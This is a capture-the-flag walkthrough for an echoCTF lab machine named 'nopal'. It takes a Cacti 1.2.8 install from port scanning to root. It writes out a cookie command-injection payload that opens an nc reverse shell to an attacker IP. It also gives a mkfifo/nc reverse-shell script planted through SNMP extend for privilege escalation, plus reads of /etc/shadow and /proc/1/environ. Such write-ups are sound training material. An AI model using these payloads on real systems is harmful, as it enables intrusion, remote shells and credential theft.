@@ -1,0 +1,50 @@
+1. We're going to machine nopal, first type sudo su and openvpn echoctf.openvp
+2. scanner ports with command nmap -sS -sV -sC -p- -vvv -oN scanner_nopal 10.0.30.124
+3. too masscan -p0-65535 10.0.30.124 -inte=1000 -e tun0
+4. enter to page, you view interface user and password of cacti
+version 1.2.8
+5. search vulnerabiliy and we found user:guest and password:guest
+6. use burpsuit for monitoring traficc and found vulnerability 
+in head of page, its a cookie modificable.
+7. edit content cookie with ;nc${IFS}-e${IFS}/bin/bash{IFS}<IP 
+in that case it was 10.10.1.50>${IFS}<port tcp/ip for that moment
+it was 1432>
+Hint: the ${IFS} is space betwen phrases.
+8. let's go to page icyberchef.com, this page encode url in its 
+option search add url and select it URL Encode, catched Encoded 
+all speciall chars
+9. open other terminal and typing: nc -nlvp 1432
+10. the content copy in content cookie and resend in burp suit.
+11. waiting to received message Connection received on 10.0.30.124 37914 in this case, machine's IP vulnerably and its port
+12. Get in machine, typing whoami, I saw www-data
+13. apply python -c 'import pty; pty.spawn("/bin/bash")' for 
+configure to pseudo-terminal and controller terminal with current
+process's standard io 
+14. send process to bachground with command CTRL+Z for make shell
+more stable.
+15 apply stty raw -echo and later fg 
+16. export TERM=xterm
+17. first flag /etc/passwd
+18. check what ports we have running locally with command ss (sockets
+stadistics) witn option t(tcp)u(udp)l(listen)p(process ID-PID)n(
+numeric don't resolve service names)
+19. We can see port used for SNMP (generally 161 or 162) and 
+let's go to /etc/snmp 
+20. We see in file snmpd.conf flag and authorized access to root
+user the server with snmp extend etsctf /tmp/snmpd-test.sh
+21. We need to change directory /tmp to create the file snmpd-test.sh
+that will hold our reverse shell payload to access root user.
+22. we create file snmpd-test.sh--->
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <10.10.1.50
+this case> 4444 >/tmp/f
+23. open other terminal and typing nc -nvlp 4444
+24.typing chmod +x snmpd-tests.sh
+25. later snmpwalk 127.0.0.1 -c public -v1 . -On
+26. agentAddress udp 127.0.0.1:161 in file snmpd.conf
+27. apply steps 13-16
+28. search in directory /etc/shadow other flag
+29. directory root.
+30. typing ps -aux (environment) PID 1
+31. let's go to directory proc/1/environ before access super user with
+su root 
